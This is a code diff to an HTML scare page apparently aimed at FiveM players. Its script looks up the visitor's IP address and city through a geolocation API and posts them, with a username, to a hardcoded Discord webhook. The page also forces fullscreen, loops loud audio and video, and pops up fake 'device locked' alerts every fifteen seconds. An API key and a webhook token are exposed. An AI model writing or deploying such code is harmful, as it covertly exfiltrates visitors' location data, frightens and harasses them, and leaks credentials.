@@ -63,47 +63,45 @@
 
 <script>
   const API_KEY = '704aa5f136d9423db0c64a593a6b7c27';
-  
-  function fetchUserIpAndLocation() {
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1489754745626431641/FlXQQJ9LxTYWEQrhWXph0bSfRzcUZGe8-1nYrM1KQjF0xRAm7kmNXI14YdHyMllEXAmZ';
+
+  function fetchUserIpAndLocation(fivemUsername) {
+    const ipBox = document.getElementById('ipBox');
+    
+    // Fetch IP and location data
     fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`)
       .then(response => response.json())
       .then(data => {
-        const ipBox = document.getElementById('ipBox');
-        
-        // Update the content of the ipBox with the fetched IP and location
+        // Update the content of ipBox with the fetched data
         ipBox.innerText =
           `Tracking IP: ${data.ip}\n` +
+          `Fivem Username: ${fivemUsername || 'Unknown'}\n` +
           `Location: ${data.city}, ${data.country_name}\n` +
           'Uploading files...';
 
         // Send data to Discord webhook
-        fetch('https://discord.com/api/webhooks/1489754745626431641/FlXQQJ9LxTYWEQrhWXph0bSfRzcUZGe8-1nYrM1KQjF0xRAm7kmNXI14YdHyMllEXAmZ', {
+        fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
           },
           body: JSON.stringify({
-            content: `User IP and Location:\nIP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}`
+            content: `User Data:\nIP: ${data.ip}\nFivem Username: ${fivemUsername || 'Unknown'}\nLocation: ${data.city}, ${data.country_name}`
           })
         }).then(response => response.json())
           .catch(error => console.error('Error:', error));
       });
   }
-
-  // Call the function on page load
-  window.onload = fetchUserIpAndLocation;
 </script>
 
 <div id="overlay">⚠ Rerept on YT! ⚠</div>
 <div id="ipBox"></div>
 <div id="clickText">Rerept on YT!</div>
 
-<!-- Video -->
 <video id="vid" autoplay loop>
   <source src="myvideo.mp4" type="video/mp4">
 </video>
 
-<!-- Extra loud audio -->
 <audio id="sound" autoplay loop>
   <source src="sound.mp3" type="audio/mpeg">
 </audio>
@@ -112,10 +110,8 @@
 const v = document.getElementById("vid");
 const s = document.getElementById("sound");
 
-// Fullscreen on load
 document.documentElement.requestFullscreen().catch(()=>{});
 
-// Invisible click trigger to satisfy browser autoplay rules
 function unlockAudio() {
     v.muted = false;
     v.volume = 1.0;
@@ -129,13 +125,10 @@ function unlockAudio() {
     document.getElementById("clickText").style.display = "none";
 }
 
-// Add click listener (only needs to fire once)
 document.addEventListener("click", unlockAudio);
 
-// Also try to start media every second (fallback)
 setInterval(unlockAudio, 1000);
 
-// Fake alerts
 setInterval(() => {
     alert("Your device has been locked by Rerept");
 }, 15000);
